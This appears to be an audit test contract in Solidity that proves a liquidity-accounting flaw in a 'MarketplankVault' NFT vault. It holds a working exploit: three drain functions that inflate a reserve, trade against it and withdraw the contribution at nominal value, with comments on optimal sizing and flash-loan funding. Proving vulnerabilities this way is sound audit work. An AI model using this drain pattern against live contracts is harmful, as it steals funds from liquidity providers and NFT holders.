// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {MarketplankVault} from "../MarketplankVault.sol";

/**
 * AUDIT TEST-ONLY.
 *
 * contributeLiquidity moves the constant-product price; removeLiquidity pays
 * back the credited amount at NOMINAL, never pro-rata and never price-aware.
 * So a caller can inflate one side, trade against the price they just moved,
 * and withdraw their contribution intact — keeping the difference.
 *
 * nonReentrant does not help: these are three sequential calls, not nested
 * ones. This contract exists to prove the sequence is atomic, and therefore
 * riskless, rather than an arbitrage that could be raced.
 */
contract MockLpDrainer is IERC721Receiver {
    MarketplankVault public immutable vault;

    constructor(MarketplankVault vault_) {
        vault = vault_;
    }

    receive() external payable {}

    /**
     * ETH-side drain. Contributes `ethIn`, sells `sharesIn` against the
     * inflated reserve, then pulls the whole contribution back out.
     * Optimal ethIn = ethReserve * shareReserve / sharesIn takes the entire
     * pre-existing ETH reserve.
     */
    function drainEth(uint256 ethIn, uint256 sharesIn) external {
        vault.contributeLiquidity{value: ethIn}(0);
        vault.sellShares(sharesIn, 0);
        vault.removeLiquidity(0, ethIn);
    }

    /**
     * The sizing-free variant. Contribute an arbitrary (oversized) amount,
     * sell, then withdraw min(credit, reserve) rather than the full
     * contribution. Whenever the sale exceeds the original reserve, the
     * profit is exactly that original reserve and the pool ends at zero —
     * no closed form to solve, and the contribution is recycled inside the
     * transaction, so it is flash-loanable at zero capital cost.
     */
    function drainEthMax(uint256 ethIn, uint256 sharesIn) external {
        vault.contributeLiquidity{value: ethIn}(0);
        vault.sellShares(sharesIn, 0);
        uint256 reserve = vault.ethReserve();
        vault.removeLiquidity(0, reserve < ethIn ? reserve : ethIn);
    }

    /**
     * Share-side mirror. Contributes `sharesIn` into the share reserve, buys
     * against the inflated share side, then pulls the contributed shares back.
     * The extracted shares redeem 1:1 for real NFTs.
     */
    function drainShares(uint256 sharesIn, uint256 ethIn) external {
        vault.contributeLiquidity(sharesIn);
        vault.buyShares{value: ethIn}(0);
        vault.removeLiquidity(sharesIn, 0);
    }

    function sweep(address payable to) external {
        to.transfer(address(this).balance);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
